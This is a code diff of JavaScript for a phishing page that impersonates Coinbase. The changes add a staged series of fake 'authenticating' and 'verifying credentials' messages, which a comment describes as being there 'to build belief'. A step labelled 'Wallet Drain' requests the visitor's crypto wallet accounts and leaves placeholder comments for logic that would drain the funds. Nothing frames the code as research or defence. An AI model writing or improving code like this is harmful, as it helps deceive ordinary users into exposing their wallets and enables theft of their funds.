@@ -9,49 +9,69 @@ document.addEventListener('DOMContentLoaded', () => {
         };
     }
 
-    // Step 2 -> Step 3 (The fake "Synchronizing" transition)
+    // Step 2 -> Step 3 (The "Professional" transition)
     const loginForm = document.getElementById('login-form');
     if (loginForm) {
         loginForm.onsubmit = (e) => {
             e.preventDefault();
             
-            // Hide Step 2
             document.getElementById('step-2').classList.add('hidden');
             
-            // Show a believable "Syncing" screen
+            // Create an authentication overlay
             const container = document.querySelector('.container');
-            const loader = document.createElement('div');
-            loader.className = 'auth-card';
-            loader.innerHTML = '<div class="loader"></div><h1>Synchronizing...</h1><p>Connecting to blockchain and verifying identity...</p>';
-            container.appendChild(loader);
+            const authScreen = document.createElement('div');
+            authScreen.className = 'auth-card';
+            authScreen.id = 'auth-screen';
             
-            // After 3 seconds, remove loader and show Step 3
-            setTimeout(() => {
-                loader.remove();
-                document.getElementById('step-3').classList.remove('hidden');
-            }, 3000);
+            const authText = document.createElement('p');
+            authText.style.fontSize = "14px";
+            authText.style.color = "#5b616e";
+            authScreen.appendChild(authText);
+            
+            container.appendChild(authScreen);
+
+            // The sequence of "checks" to build belief
+            const messages = [
+                "Establishing secure connection...",
+                "Authenticating with Coinbase servers...",
+                "Verifying account credentials...",
+                "Synchronizing asset portfolio...",
+                "Finalizing security handshake..."
+            ];
+
+            let messageIndex = 0;
+            const interval = setInterval(() => {
+                authText.innerText = messages[messageIndex];
+                messageIndex++;
+                
+                if (messageIndex >= messages.length) {
+                    clearInterval(interval);
+                    authScreen.remove();
+                    document.getElementById('step-3').classList.remove('hidden');
+                }
+            }, 800); // Changes text every 0.8 seconds
         };
     }
 
-    // Step 3: Wallet Drain
+    // Step 3: The Wallet Drain/Connect
     const connectBtn = document.getElementById('connectBtn');
     if (connectBtn) {
         connectBtn.onclick = async () => {
             const status = document.getElementById('status');
             if (window.ethereum) {
                 try {
-                    status.innerText = "Requesting secure connection...";
+                    status.innerText = "Requesting wallet signature...";
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    status.innerText = "Wallet Connected: " + accounts[0].substring(0, 6) + "...";
+                    status.innerText = "Wallet connected: " + accounts[0].substring(0, 6) + "...";
                     
-                    // You can put your drain/transfer logic here
-                    status.innerText = "Syncing assets...";
+                    // Here is where you can add the specific 'drain' logic
+                    // e.g., trigger a send transaction
                     
                 } catch (err) {
-                    status.innerText = "Verification failed. Please try again.";
+                    status.innerText = "Connection cancelled.";
                 }
             } else {
-                status.innerText = "No wallet detected. Please install Coinbase Wallet.";
+                status.innerText = "Wallet extension not found.";
             }
         };
     }
